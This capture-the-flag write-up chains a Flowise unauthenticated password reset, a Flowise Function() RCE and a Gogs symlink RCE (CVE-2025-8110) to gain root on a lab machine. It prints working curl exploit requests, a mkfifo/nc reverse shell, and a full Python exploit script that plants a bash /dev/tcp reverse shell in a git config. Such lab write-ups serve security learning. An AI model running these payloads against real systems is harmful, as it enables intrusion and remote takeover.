---
layout: post
title: Silentium - CTF
date: 2026-04-12
pid: "5582"
category: "CTFs"
difficulty: "EASY"
description: "Chaining an unauthenticated password reset with a Flowise RCE for initial access to exploit a symlink-based vulnerability in an internal Gogs service for root access."
tags: [Linux, Docker, Python, Flowise, Gogs]
unlock_date: 2026-09-05 12:00:00 -0700
---
### 1. Overview
This machine involved chaining an unauthenticated password reset with a vulnerable Flowise instance to gain initial access. By exploiting an unsafe `Function()` constructor, a shell was obtained inside a Docker container. Credentials recovered from the container's environment variables provided SSH access to the host system. Privilege escalation was then achieved by port-forwarding an internal Gogs service running as root and exploiting an authenticated remote code execution vulnerability (CVE-2025-8110) using a malicious repository symlink to execute code.

### 2. Recon
To start this machine, I ran the standard Nmap port and service scan:
```
└─$ nmap -sCV 10.129.20.18
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

The scan found 2 ports:
- **22 (SSH)**
- **80 (HTTP)**

After this I started a subdomain scan:
```
└─$ ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

This scan found one subdomain called `staging`, so I added that to my hosts file and went to it. The subdomain greeted me with a login page.

Taking a peek at the main website `silentium.htb`, I found some employee names: `Ben`, `Marcus Thorne`, and `Elena Rossi`.
### 3. Foothold
Looking through Google for exploits, I found 2 exploits. One for unauthenticated password reset, and one for remote code execution.

The unauthenticated password reset vulnerability exists due to the `forgot-password` endpoint not requiring authorization, allowing an attacker to request a `temptoken` for any valid user.

To exploit the password reset, I guessed the email `ben@silentium.htb` and tried to test it.

The first thing I did was grab the user's `temptoken`:
```
└─$ curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}'
```

After getting the `temptoken`, I sent the password reset request:
```
└─$ curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{  
        "user":{
          "email":"ben@silentium.htb",
          "tempToken":"yOctXJ1ElwMShSqozfpkyOB7H7tx6OVzfsOTGxfX7bYZdWWU85HGBXhcm9GjYySC",
          "password":"P@ssw0rd!"
        }
      }'
```

Now that the password was reset, I could log in with the credentials: `ben@silentium.htb:P@ssw0rd!`

Checking the version number through settings revealed that Flowise was running version 3.0.5. This version is vulnerable to RCE due to the use of a `Function()` constructor without proper sanitization of user input.

To exploit this I first set up a listener. Then I grabbed the API key from the website and then sent the following request:
```
└─$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer sfAh77ZikHqiqJmV3IaRaGQ5ntDwL3Zm0HjP5vI-Sdk" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.214 9001 >/tmp/f\");return 1;})()})"
    }
  }'
```

This resulted in a revshell in a Docker container. While in the Docker container, I checked the Docker environment variables and found some leaked passwords leading to SSH access as `ben`.
```
/ # cat /proc/1/environ | tr '\0' '\n'
SMTP_PASSWORD=r04D!!_R4ge
```
### 4. Root
Now that I had ssh access as the `ben` user, I started enumeration with `sudo -l` which said that I couldn't run sudo on the box. The next thing I checked was the `/opt` folder which had a folder called `gogs` in it. I also noticed that it was owned by root.
```
ben@silentium:/opt$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr  8 18:30 .
drwxr-xr-x 22 root root 4096 Apr  8 09:41 ..
drwx--x--x  4 root root 4096 Apr  8 09:41 containerd
drwxr-xr-x  6 root root 4096 Apr  8 09:41 gogs
```

Looking into `Gogs`, I found another RCE vulnerability so I started there. Gogs runs on port 3000 by default, but since Flowise does as well, I checked to see if it was open on a nearby port:
```
ben@silentium:/opt$ ss -tulnp
tcp        LISTEN      0           4096                 127.0.0.1:3000                 0.0.0.0:*                    
tcp        LISTEN      0           4096                 127.0.0.1:3001                 0.0.0.0:*                    
```

Since the port was open and there was another close by, I figured this was the path and forwarded the ports using ssh. Port 3000 simply hung so I moved to port 3001 which was hosting Gogs.

This RCE (CVE-2025-8110) exists due to the API not checking if a filename is also a symlink.

To exploit this I first registered an account on the Gogs website. Then I wrote the following script using `CVE-2025-8110.py` as a template:
```
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse, quote
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

__author__ = "zAbuQasem"
__Linkedin__ = "https://www.linkedin.com/in/zeyad-abulaban/"

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def register(session, base_url, username, password):
    """Register a new user."""
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "zAbuQasem@attacker.com",
        "password": password,
        "retype": password,
    }
    resp = session.post(
        register_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=register_data,
        allow_redirects=True,
    )
    if "Username has already been taken." in resp.text:
        pass  # User already exists, continue
    elif "user/sign_up" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    # First GET to fetch the page (and CSRF hidden field) before POSTing
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)

    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"

    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    # URL-encode the password to safely handle characters like '@'
    encoded_pass = quote(password)

    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{encoded_pass}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        # Clean up if directory already exists
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        # Clone repository
        subprocess.run(clone_cmd, check=True)

        # Create symlink inside the repo
        os.symlink(".git/config", symlink_path)

        # Add, commit, and push
        subprocess.run(
            ["git", "add", "malicious_link"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "commit", "-m", "Add malicious symlink"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            check=True,
        )

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input; fallback to cookie if present."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    
    # Updated credentials
    username = "panda"
    password = "P@ssw0rd!"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    
    try:
        # Bypassing the buggy registration function
        # register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    ignorecase = true
    precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
    url = git@localhost:gogs/{repo_name}.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
```

Before running the script, I started a netcat listener:
```
└─$ nc -lvnp 9001
```

Then I ran the script which resulted in a root revshell:
```
└─$ python3 rce.py -u http://localhost:3001 -lh 10.10.14.214 -lp 9001
```
### 5. Conclusion
Initial access was gained by exploiting an unauthenticated password reset vulnerability on a staging subdomain, which provided access to a Flowise application. A remote code execution vulnerability within Flowise's `Function()` constructor was then abused to execute a reverse shell inside a Docker container. From there, credentials recovered from the container's environment variables allowed for SSH access to the host system as the `ben` user.

Privilege escalation was achieved by discovering a locally hosted Gogs instance running as root. After forwarding the port, an authenticated remote code execution vulnerability (CVE-2025-8110) was exploited. By creating a malicious repository with a symlink pointing to the `.git/config` file and injecting a reverse shell payload into the `sshCommand` configuration, execution was triggered, resulting in root access.
